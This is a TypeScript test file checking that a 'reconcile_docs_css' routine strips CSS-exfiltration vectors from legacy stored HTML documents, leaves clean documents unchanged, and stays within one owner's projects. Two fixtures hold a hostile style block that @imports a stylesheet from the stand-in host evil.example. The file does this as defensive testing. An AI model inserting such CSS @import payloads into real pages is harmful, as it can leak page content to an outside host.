import { beforeEach, describe, expect, test } from "bun:test";
import type { Database } from "@devpad/schema/database/types";
import { create_memory_backend, type Backend } from "@f0rbit/corpus";
import { reconcile_docs_css } from "../../reconcile.js";
import { get_version, push_document_raw } from "../../store.js";
import { create_test_db, seed_project, seed_user } from "./helpers.js";

describe("reconcile_docs_css — repairs already-stored docs pushed before the CSS-exfil fix", () => {
	let db: Database;
	let backend: Backend;
	let owner_id: string;
	let project_id: string;

	beforeEach(async () => {
		db = create_test_db();
		backend = create_memory_backend();
		const owner = await seed_user(db);
		owner_id = owner.id;
		const project = await seed_project(db, owner.id);
		project_id = project.id;
	});

	test("scrubs a hostile <style> block on a pre-existing doc, bumping its version", async () => {
		// `push_document_raw` — bypasses the (now-fixed) ingest sanitizer, simulating
		// content that was pushed and stored BEFORE this fix shipped.
		const pushed = await push_document_raw(
			db,
			backend,
			{
				project_id,
				kind: "design",
				title: "Legacy design doc",
				html: `<h1>Design</h1><style>@import url("https://evil.example/x.css"); .ok { color: red; }</style>`,
			},
			"api",
		);
		expect(pushed.ok).toBe(true);
		if (!pushed.ok) return;

		const report = await reconcile_docs_css(db, backend, owner_id);
		expect(report.ok).toBe(true);
		if (!report.ok) return;
		expect(report.value.scanned).toBe(1);
		expect(report.value.reconciled).toEqual([pushed.value.id]);

		const head = await get_version(backend, pushed.value.id, undefined);
		expect(head.ok).toBe(true);
		if (!head.ok) return;
		expect(head.value.html).not.toContain("evil.example");
		expect(head.value.html).not.toContain("@import");
		expect(head.value.html).toContain(".ok { color: red; }");
		expect(head.value.html).toContain("<h1>Design</h1>");
	});

	test("a doc with no exfil vectors is left untouched (no spurious version bump)", async () => {
		const pushed = await push_document_raw(
			db,
			backend,
			{ project_id, kind: "plan", title: "Clean plan", html: "<h1>Plan</h1><style>.foo{color:red}</style>" },
			"api",
		);
		if (!pushed.ok) throw new Error("push failed");

		const report = await reconcile_docs_css(db, backend, owner_id);
		expect(report.ok).toBe(true);
		if (!report.ok) return;
		expect(report.value.scanned).toBe(1);
		expect(report.value.reconciled).toEqual([]);
	});

	test("is scoped to the calling owner's own projects", async () => {
		const other_owner = await seed_user(db, { id: "other-owner", email: "other@test.example" });
		const other_project = await seed_project(db, other_owner.id, { id: "other-project" });

		await push_document_raw(
			db,
			backend,
			{
				project_id: other_project.id,
				kind: "plan",
				title: "Someone else's doc",
				html: `<style>@import url("https://evil.example/x.css");</style>`,
			},
			"api",
		);

		const report = await reconcile_docs_css(db, backend, owner_id);
		expect(report.ok).toBe(true);
		if (!report.ok) return;
		expect(report.value.scanned).toBe(0);
	});
});
